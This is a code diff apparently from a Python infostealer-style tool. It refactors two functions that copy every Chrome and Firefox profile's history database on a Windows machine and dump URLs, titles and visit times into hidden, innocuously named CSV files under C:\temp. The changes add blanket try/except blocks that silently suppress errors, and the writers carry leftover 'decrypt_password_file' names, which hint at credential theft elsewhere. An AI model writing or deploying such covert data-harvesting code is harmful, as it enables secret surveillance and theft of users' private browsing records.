@@ -14,36 +14,39 @@ def get_chrome_history():
             os.remove("C:\\temp\\.tempcache.csv")
     except Exception:  # NOQA
         pass
+    
+    try:
+        # base path for Chrome"s User Data directory
+        base_path = os.path.join(os.getenv("APPDATA"), "..\\Local\\Google\\Chrome\\User Data")
 
-    # base path for Chrome"s User Data directory
-    base_path = os.path.join(os.getenv("APPDATA"), "..\\Local\\Google\\Chrome\\User Data")
+        # list all subdirectories in the User Data directory
+        profiles = [d for d in os.listdir(base_path) if os.path.isdir(os.path.join(base_path, d)) and (d.startswith("Profile") or d == "Default")]
 
-    # list all subdirectories in the User Data directory
-    profiles = [d for d in os.listdir(base_path) if os.path.isdir(os.path.join(base_path, d)) and (d.startswith("Profile") or d == "Default")]
+        for profile in profiles:
+            history_path = os.path.join(base_path, profile, "History")
+            if os.path.exists(history_path):
+                temp_history_path = os.path.join("C:\\temp", f"{profile}_History")
+                shutil.copyfile(history_path, temp_history_path)
 
-    for profile in profiles:
-        history_path = os.path.join(base_path, profile, "History")
-        if os.path.exists(history_path):
-            temp_history_path = os.path.join("C:\\temp", f"{profile}_History")
-            shutil.copyfile(history_path, temp_history_path)
+                # connect to the SQLite database
+                conn = sqlite3.connect(temp_history_path)
+                cursor = conn.cursor()
+                cursor.execute("SELECT url, title, last_visit_time FROM urls")
 
-            # connect to the SQLite database
-            conn = sqlite3.connect(temp_history_path)
-            cursor = conn.cursor()
-            cursor.execute("SELECT url, title, last_visit_time FROM urls")
+                def chrome_time_to_datetime(chrome_time):
+                    return datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)
+                rows = [(url, title, chrome_time_to_datetime(int(last_visit_time))) for url, title, last_visit_time in cursor.fetchall()]
 
-            def chrome_time_to_datetime(chrome_time):
-                return datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)
-            rows = [(url, title, chrome_time_to_datetime(int(last_visit_time))) for url, title, last_visit_time in cursor.fetchall()]
+                # write to csv file but don"t delete the previous data
+                with open("C:\\temp\\.tempcache.csv", mode="a", newline="", encoding="utf-8") as decrypt_password_file:
+                    decrypt_password_writer = csv.writer(decrypt_password_file, delimiter=",", quotechar='"', quoting=csv.QUOTE_MINIMAL)
+                    decrypt_password_writer.writerows(rows)
 
-            # write to csv file but don"t delete the previous data
-            with open("C:\\temp\\.tempcache.csv", mode="a", newline="", encoding="utf-8") as decrypt_password_file:
-                decrypt_password_writer = csv.writer(decrypt_password_file, delimiter=",", quotechar='"', quoting=csv.QUOTE_MINIMAL)
-                decrypt_password_writer.writerows(rows)
-
-            # close the database connection
-            conn.close()
-
+                # close the database connection
+                conn.close()
+    except Exception:  # NOQA
+        pass
+    
 def get_firefox_history():
     try:
         if os.path.exists("C:\\temp\\.tempcache2.csv"):
@@ -51,38 +54,41 @@ def get_firefox_history():
     except Exception:  # NOQA
         pass
 
-    # base path for Firefox"s User Data directory
-    base_path = os.path.join(os.getenv("APPDATA"), "..\\Roaming\\Mozilla\\Firefox\\Profiles")
+    try:
+        # base path for Firefox"s User Data directory
+        base_path = os.path.join(os.getenv("APPDATA"), "..\\Roaming\\Mozilla\\Firefox\\Profiles")
 
-    # list all subdirectories in the User Data directory
-    profiles = [d for d in os.listdir(base_path) if os.path.isdir(os.path.join(base_path, d))]
+        # list all subdirectories in the User Data directory
+        profiles = [d for d in os.listdir(base_path) if os.path.isdir(os.path.join(base_path, d))]
 
-    for profile in profiles:
-        history_path = os.path.join(base_path, profile, "places.sqlite")
-        if os.path.exists(history_path):
-            temp_history_path = os.path.join("C:\\temp", f"{profile}_places.sqlite")
-            shutil.copyfile(history_path, temp_history_path)
+        for profile in profiles:
+            history_path = os.path.join(base_path, profile, "places.sqlite")
+            if os.path.exists(history_path):
+                temp_history_path = os.path.join("C:\\temp", f"{profile}_places.sqlite")
+                shutil.copyfile(history_path, temp_history_path)
 
-            # connect to the SQLite database
-            conn = sqlite3.connect(temp_history_path)
-            cursor = conn.cursor()
-            try:
-                cursor.execute("SELECT url, title, last_visit_date FROM moz_places")
-            except sqlite3.OperationalError:
-                break
+                # connect to the SQLite database
+                conn = sqlite3.connect(temp_history_path)
+                cursor = conn.cursor()
+                try:
+                    cursor.execute("SELECT url, title, last_visit_date FROM moz_places")
+                except sqlite3.OperationalError:
+                    break
 
-            def firefox_time_to_datetime(firefox_time):
-                return datetime(1970, 1, 1) + timedelta(microseconds=firefox_time)
-            
-            rows = [(url, title, firefox_time_to_datetime(int(last_visit_date)) if last_visit_date is not None else None) for url, title, last_visit_date in cursor.fetchall()]
-    
-            # write to csv file but don"t delete the previous data
-            with open("C:\\temp\\.tempcache2.csv", mode="a", newline="", encoding="utf-8") as decrypt_password_file:
-                decrypt_password_writer = csv.writer(decrypt_password_file, delimiter=",", quotechar='"', quoting=csv.QUOTE_MINIMAL)
-                decrypt_password_writer.writerows(rows)
+                def firefox_time_to_datetime(firefox_time):
+                    return datetime(1970, 1, 1) + timedelta(microseconds=firefox_time)
+                
+                rows = [(url, title, firefox_time_to_datetime(int(last_visit_date)) if last_visit_date is not None else None) for url, title, last_visit_date in cursor.fetchall()]
+        
+                # write to csv file but don"t delete the previous data
+                with open("C:\\temp\\.tempcache2.csv", mode="a", newline="", encoding="utf-8") as decrypt_password_file:
+                    decrypt_password_writer = csv.writer(decrypt_password_file, delimiter=",", quotechar='"', quoting=csv.QUOTE_MINIMAL)
+                    decrypt_password_writer.writerows(rows)
 
-            # close the database connection
-            conn.close()
+                # close the database connection
+                conn.close()
+    except Exception:  # NOQA
+        pass
 
 def wipe_extra_data(browser, delete_before=2):
     browser = browser.lower().strip()
